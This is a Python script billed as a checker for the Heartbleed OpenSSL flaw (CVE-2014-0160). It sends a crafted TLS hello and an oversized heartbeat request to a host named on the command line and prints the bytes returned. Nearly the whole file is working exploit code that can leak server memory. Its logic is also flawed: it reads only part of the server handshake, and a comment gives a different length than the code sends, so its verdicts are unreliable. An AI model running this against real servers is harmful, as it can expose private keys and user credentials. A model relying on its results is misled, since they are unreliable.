#!/usr/bin/python3

import socket
import sys
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send (default: 1)')
options.add_option('-q', '--quiet', action='store_true', help='Suppress output')

# Hex representations of the Client Hello and Heartbeat messages
hello = bytes.fromhex('16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01')

## recieve the packets from the socket (with specified length)
def var_recv(sock, length):
    data = bytearray()
    while length:
        packet = sock.recv(length)
        if not packet:
            return None
        data.extend(packet)
        length -= len(packet)
    return bytes(data)

def check_vulnerability(host, port, quiet):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    # send client hello
    sock.send(hello)
    ## ignore server hello
    var_recv(sock, 5)

    # experimental part to show the length by varying
    payload_length = 100
    heartbeat_request = bytes.fromhex(f'18 03 02 00 03 01 {payload_length:02X} 00')
    '''
    |  Type  |  TLS Version  |   Length  |   Payload   |  Padding  |
    |--------|---------------|-----------|-------------|-----------|
    |  0x18  |   0x03 0x02   | 0x00 0x03 |  0x01 0x40  |   0x00    |
    '''
    
    sock.send(heartbeat_request)
    response = var_recv(sock, 1024) #< we will try to request more data than expected
    print(response)
    if response and len(response) > 3:
        if not quiet:
            print(f'Vulnerable: Server returned {len(response)} bytes')
        return True
    else:
        if not quiet:
            print('Not vulnerable: No extra data returned')
        return False

if __name__ == '__main__':
    (options, args) = options.parse_args()
    if len(args) < 1:
        print("Usage: {} server [options]".format(sys.argv[0]))
        sys.exit(1)

    host = args[0]
    port = options.port
    quiet = options.quiet

    if check_vulnerability(host, port, quiet):
        print(f'Host {host} appears to be VULNERABLE!')
    else:
        print(f'Host {host} appears to be NOT VULNERABLE.')
